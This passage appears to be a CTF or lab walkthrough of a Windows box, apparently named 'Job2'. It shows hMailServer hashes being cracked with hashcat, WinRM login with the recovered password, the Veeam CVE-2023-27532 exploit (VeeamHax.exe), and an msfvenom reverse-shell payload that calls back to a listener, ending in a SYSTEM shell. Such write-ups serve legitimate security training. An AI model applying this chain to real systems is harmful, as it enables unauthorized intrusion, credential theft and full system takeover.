Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
```

The database version is too old for this DLL. I’ll upgrade it (since I’m working with a copy):

![Pasted image 20260210163951.png](/ob/Pasted%20image%2020260210163951.png)

shell

`vim hmail_hashes `

```
Julian@job2.vl:8981c81abda0acadf1d12dd9d213bac7c51c022a34268058af3757607075e0eb49f76f Ferdinand@job2.vl:04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11 hr@job2.vl:1a5adad158ccffd81db73db040c72109067add598fafc47bbbd92da9a69661af94f055
```

```
$ hashcat hmail_hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1421 | hMailServer | FTP, HTTP, SMTP, LDAP Server
...[snip]...
04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11:Franzi123!
Approaching final keyspace - workload adjusted.  
...[snip]...
```

```
└─# evil-winrm-py -i JOB2  -u Ferdinand  -p Franzi123!
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'JOB2:5985' as 'Ferdinand'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\Ferdinand\Documents>

```

```
evil-winrm-py PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----          5/2/2023   7:58 PM                7-Zip                                                                 
d-----          5/7/2025   9:26 AM                Amazon                                                                
d-----          5/7/2025   9:20 AM                Common Files                                                          
d-----        10/27/2025   3:09 PM                Internet Explorer                                                     
d-----          5/2/2023   9:14 PM                Microsoft Office 15                                                   
d-----         2/10/2026   8:49 AM                Microsoft OneDrive                                                    
d-----          5/3/2023   6:16 PM                Microsoft SQL Server                                                  
d-----          5/3/2023   2:11 PM                Microsoft SQL Server Compact Edition                                  
d-----          5/3/2023   2:11 PM                Microsoft Synchronization Services                                    
d-----          5/3/2023   6:16 PM                Microsoft Visual Studio 10.0                                          
d-----          5/3/2023   6:15 PM                Microsoft.NET                                                         
d-----          5/8/2021   8:20 AM                ModifiableWindowsApps                                                 
d-----          5/3/2023   1:43 PM                MSBuild                                                               
d-----          5/3/2023   1:43 PM                Reference Assemblies                                                  
d-----          5/3/2023   6:47 PM                Veeam                                                                 
d-----          5/7/2025   9:20 AM                VMware                                                                
d-----         9/15/2021   4:38 PM                Windows Defender                                                      
d-----        10/27/2025   3:09 PM                Windows Defender Advanced Threat Protection                           
d-----        10/27/2025   3:10 PM                Windows Mail                                                          
d-----        10/27/2025   3:10 PM                Windows Media Player                                                  
d-----          5/8/2021   9:35 AM                Windows NT                                                            
d-----        10/27/2025   3:10 PM                Windows Photo Viewer                                                  
d-----          5/8/2021   8:34 AM                WindowsPowerShell                                                  
```

```shell
evil-winrm-py PS C:\Users\Administrator> ps
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    311      14    23744      37652               692   1 ai                                                            
     85       6     2700       4700              5488   1 cmd                                                           
     64       5      656       3356              1012   0 CompatTelRunner                                               
    120       9     6608      11172              2792   0 conhost                                                       
    151      10     6588      13312              3076   0 conhost                                                       
     87       7     6180      10036              4088   0 conhost                                                       
    120       9     6336      11172              4424   0 conhost                                                       
    150      10     6576      13308              4760   0 conhost                                                       
    182      12     6920      17836              7684   1 conhost                                                       
    151      10     6580      13312              7740   0 conhost                                                       
    120       9     6332      11180              8844   0 conhost                                                       
    722      27     2336       6816               436   0 csrss                                                         
    356      15     1968       6484               544   1 csrss                                                         
    382      15     3308      15244              5492   1 ctfmon                                                        
    283      15     3952      15044              4244   0 dllhost                                                       
    215      18     3360      12532              4932   0 dllhost                                                       
    860      35    26308      68876               364   1 dwm                                                           
   1541      59    24584      90052              6248   1 explorer                                                      
     39       7     2128       5152               828   1 fontdrvhost                                                   
     39       6     1644       4068               832   0 fontdrvhost                                                   
    422      41    14612      20220              2436   0 hMailServer                                                   
      0       0       60          8                 0   0 Idle                                                          
   1390      22     6284      18448               696   0 lsass                                                         
    215      14     1968       3444              6084   0 MicrosoftEdgeUpdate                                           
    471      33    22328      20444              6096   0 mscorsvw                                                      
    239      14     3008      11412              5112   0 msdtc                                                         
    173      11    10844      10872              2076   0 ngen                                                          
    137      11     5140      11048              3792   0 ngen                                                          
    230      16    10212      13496              6048   0 ngentask                                                      
    213      13    16076      14276              8252   0 ngentask                                                      
    696      24    36268      64144              2428   0 OfficeClickToRun                                              
    871      52    50356     115668              8036   1 OneDrive                                                      
    443      27    35972      38336              8692   1 OneDrive.Sync.Service                                         
    537      28    58504      73088              7596   1 powershell                                                    
      0      15     1556     101464               100   0 Registry                                                      
    264      14     3220      20476              6200   1 RuntimeBroker                                                 
    171      11     2344      14912              6964   1 RuntimeBroker                                                 
    334      18    25864      45136              7232   1 RuntimeBroker                                                 
    225      12     2104      12996              7528   1 RuntimeBroker                                                 
    657      34    31288      52148              7144   1 SearchApp                                                     
    675      12     5032       9996               676   0 services                                                      
    566      26    12060      50176              9052   1 ShellExperienceHost                                           
    565      18     5332      28164              5952   1 sihost                                                        
     57       3     1092       1228               320   0 smss                                                          
    274      15    27156      24944              2500   0 SMSvcHost                                                     
    269      17    29492      26972              3628   0 SMSvcHost                                                     
    452      22     5452      16800              2316   0 spoolsv                                                       
    180      12     2052      10236              6824   0 SppExtComObj                                                  
    238      11     8264      17116              6360   0 sppsvc                                                        
    129      13     1516       5140              2576   0 sqlbrowser                                                    
    568      33    56720      66332              3196   0 sqlceip                                                       
   1037     255   440528     361160              2472   0 sqlservr                                                      
    148      10     1852       8524              2596   0 sqlwriter                                                     
    121      11     2088       7840              2604   0 sshd                                                          
    587      28    14604      56548              6748   1 StartMenuExperienceHost                                       
    476      18     4060      13076               532   0 svchost                                                       
    148       8     1344       6352               704   0 svchost                                                       
    118       8     1236       5716               748   0 svchost                                                       
    296      16     9252      13740               760   0 svchost                                                       
    194      16     6100      10832               788   0 svchost                                                       
   1067      20     7272      24312               804   0 svchost                                                       
   1157      18     5808      12832               908   0 svchost                                                       
    135       9     1452       7884               944   0 svchost                                                       
    308      13     2576      10984               972   0 svchost                                                       
    211      12     1988      10236              1040   0 svchost                                                       
    189      10     1716      12464              1048   0 svchost                                                       
    385      15    17376      22364              1148   0 svchost                                                       
    135       9     1572       6588              1180   0 svchost                                                       
    146      21     4240       8676              1248   0 svchost                                                       
    183      10     1740       8184              1272   0 svchost                                                       
    446      10     2928       9520              1296   0 svchost                                                       
    165       8     1208       6136              1320   0 svchost                                                       
    204      11     2212      11628              1332   0 svchost                                                       
    240      11     2160       8224              1360   0 svchost                                                       
    246      13     3920      11396              1392   0 svchost                                                       
    125       9     1336       7472              1436   0 svchost                                                       
    147       9     1384       7188              1456   0 svchost                                                       
    179      11     1844       8700              1480   0 svchost                                                       
    390      19     5312      15860              1556   0 svchost                                                       
    372      14     4068      12356              1584   0 svchost                                                       
    294      12     2044       9232              1636   0 svchost                                                       
    307      21     4168      10140              1644   0 svchost                                                       
    181       9     1480       7112              1740   0 svchost                                                       
    197      13     2044      13020              1764   0 svchost                                                       
    150      10     1772       7572              1856   0 svchost                                                       
    198      13     1840       8404              1892   0 svchost                                                       
    419      32    10832      20736              1904   0 svchost                                                       
    184      11     1900       8632              1912   0 svchost                                                       
    199      10     2092       7804              1952   0 svchost                                                       
    296      21     8700      15504              1960   0 svchost                                                       
    502      14     3012      11052              2004   0 svchost                                                       
    271      13     3376      11644              2032   0 svchost                                                       
    205      10     2252       9452              2228   0 svchost                                                       
    173      12     4008      11568              2368   0 svchost                                                       
    196      23     2612      10756              2380   0 svchost                                                       
    373      15     2708      11116              2412   0 svchost                                                       
    247      16     4532      12608              2456   0 svchost                                                       
    208      11     2304       9316              2488   0 svchost                                                       
    155      42     1636       7552              2532   0 svchost                                                       
    165      10     8388      16832              2624   0 svchost                                                       
    139       9     1508       6980              2688   0 svchost                                                       
    140       8     1244       5920              2748   0 svchost                                                       
    448      17     9052      18932              2780   0 svchost                                                       
    264      34     3120      13264              2872   0 svchost                                                       
    190      13     1528       7328              2944   0 svchost                                                       
    233      14     2784      12716              3060   0 svchost                                                       
    137       9     1512      11948              3132   0 svchost                                                       
    392      24     3360      13504              3240   0 svchost                                                       
    165      11     2024       7952              3576   0 svchost                                                       
    124       8     1500       7084              4092   0 svchost                                                       
    127       9     1408       7476              5156   0 svchost                                                       
    172      10     1532       7740              5540   0 svchost                                                       
    288      16     3920      16208              5580   0 svchost                                                       
    135       9     1576       8712              5680   0 svchost                                                       
    240      14     2580      13700              5688   0 svchost                                                       
    260      14     3496      20604              5736   0 svchost                                                       
    287      15     3508      15792              5960   1 svchost                                                       
    367      17     6132      28944              5988   1 svchost                                                       
    539      31    10308      22856              6444   0 svchost                                                       
    442      27     9092      18916              6764   0 svchost                                                       
    197      11     2436      15664              8048   1 svchost                                                       
    208      13     2760      15016              8264   0 svchost                                                       
    130       9     1576       7544              8524   0 svchost                                                       
    247      14     2996      13688              8936   0 svchost                                                       
   2589       0       40        136                 4   0 System                                                        
    228      22     4020      13864              6036   1 taskhostw                                                     
    357      22    14956      23184              8344   0 taskhostw                                                     
    549      23    10096      43672              6804   1 TextInputHost                                                 
    352      25    25268      35160              3488   0 Veeam.Backup.Agent.ConfigurationService                       
    725      41    39668      64228              1508   0 Veeam.Backup.BrokerService                                    
    450      30    28372      44044              8224   0 Veeam.Backup.CatalogDataService                               
   1010      70    71196      86632              8716   0 Veeam.Backup.CloudService                                     
   1101     152   292404     321888               380   0 Veeam.Backup.ExternalInfrastructure.DbProvider                
   1098      58    56492      91232              4140   0 Veeam.Backup.Manager                                          
    453      35    33704      50532              2980   0 Veeam.Backup.MountService                                     
   1892     109   277192     244308              7332   0 Veeam.Backup.Service                                          
   1684      44    44024      73100              3312   0 Veeam.Backup.UIServer                                         
    531      34    38732      59112              8832   0 Veeam.Backup.WmiServer                                        
    214      16     1684       9108              4028   0 Veeam.Guest.Interaction.Proxy                                 
    294      22     3204      15616              3512   0 VeeamDeploymentSvc                                            
    165      12     1708       8284              3504   0 VeeamFilesysVssSvc                                            
    204      18     1860       8880              3532   0 VeeamNFSSvc                                                   
    205      16     1852       9428              3524   0 VeeamTransportSvc                                             
    170      11     2448      11180              2888   0 VGAuthService                                                 
    124       9     1536       6624              2928   0 vm3dservice                                                   
    131      10     1688       7108              3300   1 vm3dservice                                                   
    429      24    10168      24356              2916   0 vmtoolsd                                                      
    269      18     5100      17604              7972   1 vmtoolsd                                                      
    151      11     1348       7244               536   0 wininit                                                       
    277      14     3072      12888               624   1 winlogon                                                      
   1112      47    92088     105940              2680   1 WINWORD                                                       
    172      10     1620       8496              4124   0 WmiApSrv                                                      
    370      17     8380      17688              4664   0 WmiPrvSE                                                      
    352      21    12600      22304              7180   0 WmiPrvSE                                                      
    621      27    67768      84116       1.64   7344   0 wsmprovhost                    
```

![Pasted image 20260214113831.png](/ob/Pasted%20image%2020260214113831.png)

```
evil-winrm-py PS C:\Program Files>  [System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.S
hell.exe").FileVersion
10.0.1.4854
10.0.1.4854
evil-winrm-py PS C:\Program Files>

```

I’ll find [CVE-2023-27532](https://nvd.nist.gov/vuln/detail/cve-2023-27532):

> Vulnerability in Veeam Backup & Replication component allows encrypted credentials stored in the configuration database to be obtained. This may lead to gaining access to the backup infrastructure hosts.

```
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# git clone https://github.com/puckiestyle/CVE-2023-27532-RCE-Only.git                                                   
Cloning into 'CVE-2023-27532-RCE-Only'...
remote: Enumerating objects: 75, done.
remote: Counting objects: 100% (75/75), done.
remote: Compressing objects: 100% (44/44), done.
remote: Total 75 (delta 34), reused 62 (delta 30), pack-reused 0 (from 0)
Receiving objects: 100% (75/75), 2.69 MiB | 1.83 MiB/s, done.
Resolving deltas: 100% (34/34), done.
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# cd CVE-2023-27532-RCE-Only 
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop/CVE-2023-27532-RCE-Only]
└─# ls
App.config            macro_puck.docm  Properties                 Readme.md                Veeam.Backup.Interaction.MountService.dll  VeeamHax1.png  VeeamHax3.png    VeeamHax.exe  VeeamHax_TemporaryKey.pfx
macro_puck_create.py  Program.cs       rcat_192.168.1.41_443.exe  Veeam.Backup.Common.dll  Veeam.Backup.Model.dll                     VeeamHax2.png  VeeamHax.csproj  VeeamHax.sln
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop/CVE-2023-27532-RCE-Only]
└─# mv *.dll ../                                                    
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop/CVE-2023-27532-RCE-Only]
└─# mv VeeamHax.exe ../
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop/CVE-2023-27532-RCE-Only]
└─# cd ..    
```

```

evil-winrm-py PS C:\programdata> upload Veeam.Backup.Common.dll   Veeam.Backup.Interaction.MountService.dll   Veeam.Backup.Model.dll   VeeamHax.exe
 
Uploading /root/Desktop/Veeam.Backup.Common.dll: 1.81MB [01:12, 26.2kB/s]                                                                                    
[+] File uploaded successfully as: C:\programdata\Veeam.Backup.Interaction.MountService.dll
evil-winrm-py PS C:\programdata>

```

```
└─#  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17  LPORT=443  -f exe -o reverse.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
                                    
```

```
evil-winrm-py PS C:\programdata> .\VeeamHax.exe --cmd "C:\programdata\reverse.exe"

```

```
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─#  rlwrap  -cAr nc -nvlp 443
listening on [any] 443 ...



connect to [10.10.14.17] from (UNKNOWN) [10.129.238.35] 55376
Microsoft Windows [Version 10.0.20348.4297]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
C:\WINDOWS\system32>
C:\WINDOWS\system32>
C:\WINDOWS\system32>whoami 
whoami 
nt authority\system

C:\WINDOWS\system32>

```

![Pasted image 20260214121329.png](/ob/Pasted%20image%2020260214121329.png)
